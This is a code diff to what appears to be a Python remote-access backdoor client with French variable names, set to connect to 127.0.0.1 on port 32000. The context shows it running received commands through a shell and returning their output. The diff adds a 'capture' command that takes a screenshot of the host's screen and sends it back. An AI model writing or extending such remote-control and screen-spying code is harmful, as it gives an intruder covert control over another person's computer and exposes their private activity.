@@ -4,6 +4,7 @@ import time
 import subprocess
 import platform
 import os
+from PIL import ImageGrab
 
 HOST_IP = "127.0.0.1"
 HOST_PORT = 32000
@@ -49,6 +50,17 @@ while True:
         else:
             reponse = f.read()
             f.close()
+    elif len(commande_split) == 2 and commande_split[0] == "capture":
+            capture_ecran = ImageGrab.grab()
+            capture_filename = commande_split[1] + ".png"
+            capture_ecran.save(capture_filename, "PNG")
+            try:
+                f = open(capture_filename, "rb")
+            except FileNotFoundError:
+                reponse = " ".encode()
+            else:
+                reponse = f.read()
+                f.close()
     else:
         resultat = subprocess.run(commande, shell=True, capture_output=True, universal_newlines=True)
         reponse = resultat.stdout + resultat.stderr
